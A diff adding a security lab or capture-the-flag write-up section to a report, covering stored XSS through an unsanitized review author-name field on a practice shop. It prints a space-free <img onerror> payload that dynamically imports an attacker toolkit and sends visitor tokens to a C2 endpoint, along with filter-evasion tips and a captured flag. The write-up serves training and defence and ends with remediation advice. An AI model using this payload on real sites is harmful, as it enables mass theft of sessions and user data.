@@ -481,3 +481,78 @@ An attacker can steal session-bound secrets (CSRF tokens, session identifiers, t
 | Don't expose secrets to script | A session token in a readable DOM node is exfiltratable by any XSS. |
 
 
+## Task 2: Stored XSS — Product Reviews (Username Field)
+
+### Vulnerability Description
+
+NexusShop's product review feature persists user-submitted reviews and renders them back to every visitor of the product page without context-appropriate output encoding. Across the three stages, the review **body** is progressively protected (unfiltered → `<script>` stripped), but the review **author name** field remains unsanitized in its text-content reflection — the classic "forgotten field." Because the stored value is rendered with a `|safe`-style raw output, any HTML an attacker submits becomes live DOM, and an element with an auto-firing event handler (`<img onerror>`) executes JavaScript in the browser of **every** user who loads the page, with no interaction required.
+
+This is a **stored (persistent)** XSS: the payload is injected once into the server's database and executes repeatedly for all subsequent viewers until the data is cleaned. It exists because the application trusts the stored content at render time — treating input validation at submission as a substitute for output encoding at display — and because the developer sanitized the obvious `review` field while overlooking the `name` field, which is reflected both inside a `title="..."` attribute (safely encoded) and as the author's display text (unencoded).
+
+### Location & Parameters
+| Attribute | Details |
+|-----------|---------|
+| **URL** | `/product/1/reviews` (Stage 1), `/product/1/reviews/verified` (Stage 2), `/product/1/reviews/all` (Stage 3 — flag) |
+| **Parameter/Field** | `name` (author) — primary sink for Stage 3; `review` (body) for Stages 1–2 |
+| **Type** | Stored / Persistent XSS |
+| **Severity** | Critical |
+
+### Attack Vector
+
+1. Submit a benign review and locate where each field reflects. The `review` body renders in `<div class="text-zinc-300">…</div>`; the `name` renders as `<span class="font-medium" title="NAME">NAME</span>` — reflected in both an attribute and as text.
+2. Prove HTML injection: a `<b>` tag in the body renders bold → raw HTML sink confirmed (Stage 1, unfiltered).
+3. Escalate to automatic JS execution with an auto-firing element: `<img src=x onerror=…>` fires on load without user interaction. Stage 2 strips `<script>` but leaves event handlers untouched, so `<img onerror>` still executes.
+4. Stage 3: the body is locked down, so pivot to the **`name`** field (the hint: "the review form has more than one field"). The `name` text-content reflection executes raw HTML.
+5. Defeat the attribute-context constraints in `name`: avoid spaces (use `/` as attribute separators), avoid `>` inside the handler (use `function(){}` not `()=>`), and avoid `'`/`"` (use backticks) so the payload survives both the `title="…"` quoting and HTML tag parsing.
+6. Load the C2 toolkit and call the full-compromise function, pointing it at the **reviews-feature** callback path with the **session-correct** level/stage, to exfiltrate data and capture the flag.
+
+### Payload Used
+
+Stored in the **name** field (review body irrelevant):
+
+```html
+<img/src/onerror=import(`/attacker/toolkit.js`).then(function(){XSS.pwn(4,3,`/product/reviews/api/track`)})>
+```
+
+Filter-evasion notes:
+- `<img/src/onerror=…>` — forward slashes act as attribute separators, so the payload contains **no spaces** (spaces would split the value into bogus HTML attributes).
+- `function(){…}` instead of an arrow function — avoids `>`, which the HTML parser would read as the end of the `<img>` tag and truncate the handler.
+- Backticks for all strings — avoid `'`/`"`, which would collide with the surrounding `title="…"` attribute quoting.
+- `import()` dynamically loads the toolkit as a module, then `.then(...)` runs `pwn` after it is available.
+
+Key parameters (discovered, not assumed):
+- **callbackPath `/product/reviews/api/track`** — found by probing: a wrong path returns HTTP 404, whereas the correct endpoint returns `{"status":"error"}` until supplied the valid live token. (Reusing Task 1's `/products/sort/api/track` always failed — the track endpoint is feature-specific.)
+- **level 4, stage 3** — taken from the server-side scoreboard in the session cookie (`"level_4_stage":3`), not from the exercise number. The server validates against the session's actual level.
+
+### Evidence
+
+- C2 Live Loot Feed recorded a `tokens` capture tagged **Level 4 / Stage 3** with a non-empty tracking value, e.g. `{"tracking":"Q5cAmWf8EwcDPztUmlYIJg","localStorage":"{}","sessionStorage":"{}"}` — demonstrating that the stored payload exfiltrated per-visitor data to the attacker-controlled C2.
+- The toolkit's `pwn()` also issued the flag-capture callback, and the server returned:
+
+```json
+{"ref":"FLAG{3813fad2d10b442e2fd23a089f3419fb}","status":"tracked"}
+```
+
+- Persistence verified: the payload fired automatically on a clean page reload (no re-injection), confirming it is stored server-side and affects every visitor.
+- Screenshot: `XSS_Task2_Stage3_Flag_ok.png` (network response showing `status: tracked` and the flag).
+
+### Real-World Impact
+
+Stored XSS on a high-traffic product page is among the most damaging web vulnerabilities. A single injected review would execute in the browser of **every** customer who views that product — potentially millions of executions — with no victim action required. An attacker could:
+
+- Steal session cookies and authentication tokens, enabling mass account takeover (note: in this lab the session cookie was `HttpOnly`, which blocked `document.cookie` theft — a reminder that `HttpOnly` is an effective layer, though it does not stop other exfiltration such as tokens rendered into the DOM).
+- Harvest credentials by injecting a convincing fake "session expired" login overlay on the trusted domain.
+- Log keystrokes, capturing credit-card and password entry during checkout.
+- Hijack form submissions, deface the page, or pivot to internal admin functionality.
+
+Because the payload is persistent, the compromise continues silently until someone detects it and purges the database — so the blast radius grows with every page view.
+
+### Remediation
+
+- **Context-aware output encoding at render time** for every reflected field, including the author `name`. Encode for the exact context: HTML-entity-encode text nodes (`<`, `>`, `&`, `"`, `'`), and never emit user data with a raw/`|safe` filter.
+- **Do not trust "short" or "trusted" fields.** The `name` field was the overlooked sink; apply the same encoding to all user-controlled fields, not just the obvious comment body.
+- **Replace blocklist filtering with allowlisting / proper encoding.** Stripping `<script>` is trivially bypassed by event-handler elements (`<img onerror>`, `<svg onload>`); it is not a defense.
+- **Deploy a Content-Security-Policy** with per-response nonces and without `unsafe-inline`; this alone would have blocked the injected inline execution and the dynamic `import()` of the attacker toolkit.
+- **Keep secrets out of the DOM.** The `tracking-id` token is readable by any script on the page; store sensitive tokens in `HttpOnly` cookies or server-side state instead of hidden DOM elements.
+- **Sanitize on output with a vetted library** (e.g. a well-maintained HTML sanitizer) if rich content must be allowed, rather than rendering raw user HTML.
+
